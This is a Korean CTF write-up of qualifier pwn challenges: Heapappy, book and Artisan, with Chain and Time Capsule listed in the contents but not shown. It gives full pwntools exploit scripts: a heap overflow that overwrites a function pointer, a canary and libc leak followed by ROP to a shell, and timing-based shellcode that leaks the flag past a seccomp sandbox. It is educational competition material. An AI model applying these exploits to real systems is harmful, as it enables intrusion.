![[Pasted image 20250817185028.png]]

예선 1등으로 본선에 간다. 청소년부에 폰은 총 6문제 출제되었다. (Heapappy : 250, book : 487, Artisan : 86, Chain : 962, Time Capsule : 962, MyBlog : 1000(0 Solve)) 대회 진행 중 마지막 문제를 제외한 5문제를 풀었다. MyBlog도 조금만 집중하면 풀 수 있었을 거 같은데 커널 문제를 풀 때 조건을 제대로 확인하지 않아서 두 시간을 날리기도 했고, 우리 팀 리버서도 나를 도와줄 정신 상태가 아니어서 깔끔하게 접고 쉬었다. 각설하고 풀이를 적어보겠다.

---
## 목차

1. Heapappy
2. book
3. Artisan
4. Chain
5. Time Capsule

---

# Heapappy

```bash
[*] '/mnt/d/cce/qual/Heapappy/prob'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

PIE가 꺼져 있고 Partial RELRO이다.

```C
unsigned __int64 prompt()
{
  unsigned __int64 v1; // [rsp+0h] [rbp-40h]
  char nptr[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v3; // [rsp+38h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v1 = 0LL;
  printf("Choice: ");
  while ( v1 <= 0x1E && fread(&nptr[v1], 1uLL, 1uLL, stdin) == 1 )
  {
    if ( nptr[v1] == 10 )
    {
      nptr[v1] = 0;
      break;
    }
    ++v1;
  }
  nptr[v1] = 0;
  return strtoul(nptr, 0LL, 10);
}

unsigned __int64 __fastcall input(__int64 a1, unsigned __int64 a2)
{
  char ptr; // [rsp+17h] [rbp-19h] BYREF
  unsigned __int64 i; // [rsp+18h] [rbp-18h]
  size_t v5; // [rsp+20h] [rbp-10h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  for ( i = 0LL; ; ++i )
  {
    if ( i >= a2 )
      return i;
    v5 = fread(&ptr, 1uLL, 1uLL, stdin);
    if ( v5 != 1 )
      break;
    if ( ptr == 10 )
      return i;
    *(_BYTE *)(i + a1) = ptr;
  }
  if ( feof(stdin) )
    fwrite("ERROR: Reached EOF\n", 1uLL, 0x13uLL, stderr);
  else
    fwrite("ERROR: fread failed\n", 1uLL, 0x14uLL, stderr);
  return i;
}

int adopt()
{
  __int64 v1; // [rsp+0h] [rbp-10h]

  if ( pet )
    return puts("Already adopted.");
  pet = malloc(0x28uLL);
  if ( !pet )
    exit(1);
  memset(pet, 0, 0x28uLL);
  *((_DWORD *)pet + 6) = 0;
  *((_QWORD *)pet + 4) = act_tutorial;
  printf("Name length: ");
  v1 = prompt();
  if ( v1 > 24 )
    return puts("Name too long.");
  printf("Name bytes: ");
  input((__int64)pet, v1);
  return puts("Adopted.");
}
```

`adopt` 함수에서 이름의 길이 변수인 `v1`이 `signed __int64` 임을 알 수 있다. 따라서 음수를 입력하면 조건문을 통과한다. 그런데 `input` 함수에서는 `rsi`를 `unsigned __int64`로 해석하고 있으므로 `heap overflow`가 발생한다.

```C
int perform_ritual()
{
  if ( pet )
    return (*((__int64 (__fastcall **)(void *))pet + 4))(pet);
  else
    return puts("Adopt first.");
}
```

`perform_ritual` 함수에서 `heap`에 있는 함수 포인터를 참조하여 실행하는 부분이 있으므로 이를 `win` 함수로 덮어 쉘을 딴다.

### ex.py

```python
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
args = parser.parse_args()

gdb_cmds = [
    'b *$rebase(0x000000000001568)',
    'c'
]

binary = './prob'
 
context.binary = binary
context.arch = 'amd64'
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

if args.remote:
    p = remote("3.38.164.12", 3030)
else:
    p = process(binary)
    if args.gdb:
        gdb.attach(p, '\n'.join(gdb_cmds))

p.sendlineafter(b'Choice: ', b'1')
p.sendlineafter(b'Choice: ', b'-1')
p.sendlineafter(b': ', b'a' * 0x20 + p64(0x40184d))
p.sendlineafter(b'Choice: ', b'3')

p.interactive()
```

---
# book

```C
[*] '/mnt/d/cce/qual/book/prob'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

특징은 없다.

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+24h] [rbp-11Ch] BYREF
  void *buf; // [rsp+28h] [rbp-118h]
  char s[264]; // [rsp+30h] [rbp-110h] BYREF
  unsigned __int64 v7; // [rsp+138h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  v4 = -1;
  init();
  memset(s, 0, 0x100uLL);
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%d", &v4);
    if ( v4 == 4 )
      return 0;
    if ( v4 == 3 )
    {
      if ( added )
      {
        printf("Page number: ");
        __isoc99_scanf("%u", &pagenum);
        if ( (unsigned int)pagenum > 4 )
        {
          puts("[ERROR] Only [0~3] page is available");
          exit(-1);
        }
        printf("Edit size: ");
        __isoc99_scanf("%u", &edit_size);
        if ( (unsigned int)edit_size > 0x40 )
        {
          puts("[ERROR] Too large");
          exit(-1);
        }
        printf("Write content : ");
        buf = &s[pagenum << 6];
        read(0, buf, 0x40uLL);
      }
      else
      {
LABEL_14:
        puts("Write a article first");
      }
    }
    else
    {
      if ( v4 > 3 )
        goto LABEL_22;
      if ( v4 == 1 )
      {
        if ( added )
        {
          puts("article already written");
        }
        else
        {
          printf("Enter article size : ");
          __isoc99_scanf("%u", &size);
          if ( (unsigned int)size > 0x100 )
          {
            puts("[ERROR] Too large");
            exit(-1);
          }
          printf("Write content : ");
          read(0, s, (unsigned int)size);
          ++added;
        }
      }
      else if ( v4 == 2 )
      {
        if ( !added )
          goto LABEL_14;
        printf("Content: %s\n", s);
      }
      else
      {
LABEL_22:
        puts("Invalid choice");
      }
    }
  }
}
```

`edit`에서 `pagenum`을 잘못 관리해서 4가 통과된다. 입출력이 모두 있으므로 `ROP` 해준다. 이게 250점이 아닌 게 신기하다.

### ex.py

```python
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
args = parser.parse_args()

gdb_cmds = [
    'b *$rebase(0x150c)',
    'c'
]

binary = './prob'
 
context.binary = binary
context.arch = 'amd64'
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

if args.remote:
    p = remote("15.165.12.135", 12345)
else:
    p = process(binary)
    if args.gdb:
        gdb.attach(p, '\n'.join(gdb_cmds))
l = ELF('./libc.so.6')

def edit(idx : int, sz : int, ctt : bytes):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(sz).encode())
    p.sendafter(b': ', ctt)

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'256')
p.sendafter(b': ', b'a' * 0x100)

edit(4, 9, b'a' * 9)
p.sendlineafter(b'> ', b'2')
p.recvuntil(b'Content: ' + b'a' * (0x100 + 9))
canary = u64(b'\x00' + p.recvn(7))
print(hex(canary))

edit(4, 0x18, b'a' * 0x18)
p.sendlineafter(b'> ', b'2')
p.recvuntil(b'Content: ' + b'a' * (0x100 + 0x18))
l.address = u64(p.recvn(6).ljust(8, b'\x00')) - 0x2a1ca
print(hex(l.address))

ret = l.address + 0x000000000002882f
pop_rdi = l.address + 0x000000000010f75b
system = l.sym['system']
binsh = list(l.search(b'/bin/sh'))[0]
edit(4, 0x18 + 0x20, b'a' * 0x8 + p64(canary) + b'a' * 8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system))
p.sendlineafter(b'> ', b'4')
p.interactive()
```

---

# Artisan

문제에서 prob.c 파일만 제공하여서 보호 기법을 알 수 없다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include <fcntl.h>
#include <seccomp.h>
#include <linux/seccomp.h>

#define LENGTH 128

volatile char flag_mem[0x50] = {0};

void sandbox(){
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	if (ctx == NULL) {
		printf("seccomp error\n");
		exit(0);
	}

	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(nanosleep), 0);

	if (seccomp_load(ctx) < 0){
		seccomp_release(ctx);
		printf("seccomp error\n");
		exit(0);
	}
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";

int main(int argc, char* argv[]){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);
    
    int fd = open("./flag", O_RDONLY);
    if (fd == -1) {
        perror("open");
        return 1;
    }
    read(fd, flag_mem, 0x50);
    close(fd);
    
	char* sh = (char*)mmap((void*)0x40400000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	memset(sh, 0x90, 0x1000);
	memcpy(sh, stub, strlen(stub));
	
	int offset = sizeof(stub);
	printf("Enter your shellcode: ");
	read(0, sh+offset, 0x900);

	alarm(10);
	chroot("/home/ctf");
	sandbox();
	((void (*)(void))sh)();
	return 0;
}
```

`flag`가 `bss` 영역에 저장되어 있다. `sandbox`에서의 `seccomp` 설정으로 `nanosleep` 함수만 허용하고 있다. 그 후 `stub`에 저장된 쉘코드를 실행한 후 유저가 입력한 쉘 코드를 입력한다. `stub`에 저장된 쉘코드는 `rsp, rip`를 제외한 모든 레지스터를 0으로 초기화한다.
`flag`를 얻기 위해 두 가지 작업을 해야 한다. 첫 번째는 `flag`가 저장된 주소를 찾는 것이다. `*($rsp)`가 `code` 영역 주소이므로 `bss` 영역의 시작 주소를 얻을 수 있다. 그로부터 조금 넉넉하게 여유를 두어 약간 앞으로 주소를 잡고 브루트포싱으로 `c` 글자를 탐색한다. 탐색 방법은 `time based sql injection`과 같은 논리이다. 해당 메모리에 `c`가 저장되어 있으면 2초 `sleep`을 하고, 아니라면 바로 종료한다.
두 번째는 `flag`를 읽는 것이다. 이를 위해 두 가지 방법을 생각했다. 가장 처음 생각한 건 8바이트씩 끊어서 이분탐색을 하는 것이었는데, 물론 굉장히 빠르겠지만 이분 탐색 코드 짜기가 귀찮았고 시간도 넉넉해서 직관적인 생각을 코드로 옮기고자 했다. 그래서 단순하게 1비트씩 확인하는 코드로 짰다. 이 코드는 30분 정도 걸렸다. 대회 끝나고 짠 이분탐색 코드도 함께 첨부하겠다.

### ex.py

```python
from pwn import *
from datetime import datetime

binary = './prob'
 
context.binary = binary
context.arch = 'amd64'
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# find flag address
"""
for i in range(0x1000):
    try:   
        #p = process(binary)
        #gdb.attach(p)
        p = remote('3.38.198.197', 54321)
        offset = 0x4000 - 0x1572 + i
        payload = f'''
            pop r10
            add r10, {offset}
            mov al, byte ptr [r10]
            cmp al, 99
            jne skip_sleep

            push 0
            push 2
            mov rdi, rsp
            mov rax, 35
            syscall

        skip_sleep:
            mov rax, 60
            mov rdi, 0
            syscall
        '''
        p.sendafter(b': ', asm(payload))
        start = datetime.now()
        p.recvline()
        p.recvline()
    except:
        end = datetime.now()
        p.close()
    t = (end-start).total_seconds()
    print(hex(i), t)
    if t > 1.5 : 
        print(hex(i))
        print(offset)
        exit()
""" # 0x2e

# get flag by compare bit by bit
flag = ""
k = 0

for i in range(400):
    try:   
        #p = process(binary)
        p = remote('3.38.198.197', 54321)
        offset = 0x4000 - 0x1572 + 0x2e
        payload = f'''
            pop r10
            add r10, {offset}
            add r10, {i // 8}
            mov al, byte ptr [r10]
            shr al, {i % 8}

            and al, 1
            cmp al, 1
            jne skip_sleep

            push 0
            push 2
            mov rdi, rsp
            mov rax, 35
            syscall

        skip_sleep:
            mov rax, 60
            mov rdi, 0
            syscall
        '''
        p.sendafter(b': ', asm(payload))
        start = datetime.now()
        p.recvline()
        p.recvline()
    except:
        end = datetime.now()
        p.close()
    t = (end-start).total_seconds()
    if t > 1.5 : 
        k += 1 << (i % 8)
    if (i % 8) == 7:
        flag += chr(k)
        k = 0
        print(flag)
        if chr(k) == '}' : exit(0)

"""

"""
```